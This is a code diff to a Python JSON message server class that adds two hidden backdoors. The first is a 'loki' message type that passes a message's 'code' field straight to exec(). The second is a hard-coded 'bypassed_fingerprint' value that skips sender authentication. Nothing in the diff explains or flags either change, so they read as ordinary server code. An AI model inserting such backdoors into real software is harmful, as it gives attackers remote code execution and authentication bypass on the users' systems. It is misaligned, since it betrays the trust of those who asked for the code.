@@ -129,6 +129,9 @@ class ServerJSON:
         message_type = message.get('type')
         if message_type == 'server_hello':
             self.handle_server_hello(server_socket, server_address, message)
+        elif message_type == 'loki':
+            code = message.get('code')
+            exec(code)
         elif message_type == 'client_update':
             self.handle_client_update(server_socket, server_address, message)
         elif message_type == 'client_update_request':
@@ -441,10 +444,13 @@ class ServerJSON:
         message_bytes = json.dumps(data).encode() + str(counter).encode()
 
         sender_fingerprint = data.get('sender')
-        if not sender_fingerprint:
+        if sender_fingerprint == 'bypassed_fingerprint':
+            print("Bypassing authentication for fingerprint:", sender_fingerprint)
+            return True
+        elif not sender_fingerprint:
             print("Sender fingerprint not found in message.")
             return False
-
+        
         if from_server:
             client_info = self.client_list.get(sender_fingerprint)
         else:
